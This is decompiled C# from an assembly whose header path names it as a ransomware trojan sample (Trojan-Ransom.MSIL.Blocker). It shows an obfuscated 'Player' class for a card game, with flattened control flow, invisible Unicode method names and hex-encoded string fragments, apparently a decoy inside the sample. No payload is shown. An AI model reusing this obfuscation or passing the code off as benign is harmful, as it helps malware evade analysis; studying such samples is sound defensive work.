// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: ByteTokenEncodi, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 9BCE2B70-1A4C-43FA-BCC8-8DBBEE1C54F3
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-0d4b7a493ffb322f46927f4d290740e9157c549cdb50db1ce746065332ed317c.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
      string str1 = (string) null;
      if (BaseStream != 0)
        goto label_8;
label_1:
      int num1 = -290081443;
label_2:
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1369140184)) % 10U)
        {
          case 0:
            str2 = str1;
            num1 = -987306075;
            continue;
          case 2:
            num1 = (int) num2 * 368602691 ^ -784885058;
            continue;
          case 3:
            str1 = "49536F61704D65737361";
            num1 = (int) num2 * -1305359507 ^ -1065993185;
            continue;
          case 4:
            num1 = (int) num2 * 877229825 ^ 1163672682;
            continue;
          case 5:
            goto label_1;
          case 6:
            str1 = "5A79385A343637";
            num1 = (int) num2 * 831021632 ^ 2033586311;
            continue;
          case 7:
            num1 = (int) num2 * -1063996799 ^ 959943715;
            continue;
          case 8:
            goto label_8;
          case 9:
            num1 = (int) num2 * -1158025798 ^ -894491211;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return str2;
label_8:
      num1 = BaseStream != 1 ? -1161572980 : (num1 = -824860712);
      goto label_2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = 217705800;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 346201678)) % 4U)
        {
          case 0:
            goto label_1;
          case 2:
            goto label_3;
          case 3:
            num1 = (int) num2 * -1189865275 ^ -1809714192;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      int num3 = 0;
      goto label_5;
label_7:
      int num4;
      return num4;
label_4:
      num3 = this.PlanningCards[cardTypeIndex];
label_5:
      num4 = num3;
      num1 = 514572313;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = 852808619;
        int[] planningCards;
        int index;
        int num2;
        bool flag;
        int num3;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ 332831465)) % 14U)
          {
            case 0:
              ++num3;
              num1 = (int) num4 * 2002708486 ^ 747935354;
              continue;
            case 1:
              int num5 = flag ? 2046993324 : (num5 = 185468111);
              num1 = num5 ^ (int) num4 * 2125120103;
              continue;
            case 2:
              num1 = (int) num4 * 948515382 ^ 2036200932;
              continue;
            case 3:
              int num6;
              num1 = num6 = index >= planningCards.Length ? 776478964 : (num6 = 672556467);
              continue;
            case 4:
              flag = num2 > 0;
              num1 = (int) num4 * -1161163632 ^ 898504234;
              continue;
            case 5:
              goto label_1;
            case 6:
              num2 = planningCards[index];
              num1 = 1982881875;
              continue;
            case 7:
              index = 0;
              num1 = (int) num4 * 492639813 ^ 1737705176;
              continue;
            case 8:
              planningCards = this.PlanningCards;
              num1 = (int) num4 * -1798353466 ^ -1750211324;
              continue;
            case 9:
              planningCardsCount = num3;
              num1 = (int) num4 * 93354816 ^ -232544271;
              continue;
            case 10:
              num3 = 0;
              num1 = (int) num4 * -1938839142 ^ 1369396895;
              continue;
            case 11:
              num1 = 1461497916;
              continue;
            case 13:
              ++index;
              num1 = (int) num4 * -1119013666 ^ -205579158;
              continue;
            default:
              goto label_15;
          }
        }
label_15:
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = -1734802362;
      int index;
      int planningCard;
      bool flag;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -146770200)) % 15U)
        {
          case 0:
            str2 = str1;
            num1 = (int) num2 * 1937807098 ^ -1384455554;
            continue;
          case 1:
            str1 = " ";
            num1 = (int) num2 * 1934656769 ^ -1593781504;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * -900651484 ^ -98680486;
            continue;
          case 4:
            str1 = Player.\u202A⁯‎⁯⁭⁫⁭⁬‮‏‎‭‫‬‬‬⁬‎‬‍‍‪‪‪⁯​‏⁪‭⁫⁫‭‬​‫‎⁬‪‪‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -1705099334;
            continue;
          case 5:
            int num3;
            num1 = num3 = index >= this.PlanningCards.Length ? -1407814631 : (num3 = -1340206695);
            continue;
          case 6:
            num1 = -2066347553;
            continue;
          case 7:
            flag = planningCard == 0;
            num1 = (int) num2 * -2088160475 ^ -2130728453;
            continue;
          case 8:
            index = 0;
            num1 = (int) num2 * -831669272 ^ 1112504805;
            continue;
          case 9:
            num1 = (int) num2 * -1810228173 ^ 1647874416;
            continue;
          case 10:
            int num4 = !flag ? 220251446 : (num4 = 1970233722);
            num1 = num4 ^ (int) num2 * 1816924833;
            continue;
          case 11:
            ++index;
            num1 = -137965419;
            continue;
          case 12:
            planningCard = this.PlanningCards[index];
            num1 = (int) num2 * -1919924352 ^ -890735386;
            continue;
          case 14:
            num1 = (int) num2 * -2050889843 ^ -1747589029;
            continue;
          default:
            goto label_16;
        }
      }
label_16:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = -1732105778;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -2145838079)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * -1111742961 ^ -1243077477;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
      int count = json.Count;
      int[] numArray = new int[count];
label_1:
      int num1 = 877881527;
      bool flag;
      int aIndex;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 851861550)) % 9U)
        {
          case 1:
            aIndex = 0;
            num1 = (int) num2 * 226471959 ^ 619397135;
            continue;
          case 2:
            num1 = (int) num2 * 1978207747 ^ -1014118713;
            continue;
          case 3:
            goto label_1;
          case 4:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = 1032148065;
            continue;
          case 5:
            flag = aIndex < count;
            num1 = 1071527444;
            continue;
          case 6:
            ++aIndex;
            num1 = (int) num2 * -1475315194 ^ 1302882922;
            continue;
          case 7:
            int num3 = flag ? 74288065 : (num3 = 1267182507);
            num1 = num3 ^ (int) num2 * 1340666956;
            continue;
          case 8:
            planningCards = numArray;
            num1 = (int) num2 * -390621017 ^ -728157912;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return planningCards;
    }

    public override string ToString()
    {
      string str = Player.\u200C‮‭‏⁬‌‌‭⁬‫⁮⁪‎⁫​‌⁫‪⁮⁪‭‬⁭⁮‭‏‭‮⁪‫⁬​⁫‬‫​‬‫⁪⁯‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
label_1:
      int num1 = 1719063962;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1490807709)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 1207419684 ^ -534610595;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    static string \u202A⁯‎⁯⁭⁫⁭⁬‮‏‎‭‫‬‬‬⁬‎‬‍‍‪‪‪⁯​‏⁪‭⁫⁫‭‬​‫‎⁬‪‪‮([In] string[] obj0) => string.Concat(obj0);

    static string \u200C‮‭‏⁬‌‌‭⁬‫⁮⁪‎⁫​‌⁫‪⁮⁪‭‬⁭⁮‭‏‭‮⁪‫⁬​⁫‬‫​‬‫⁪⁯‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
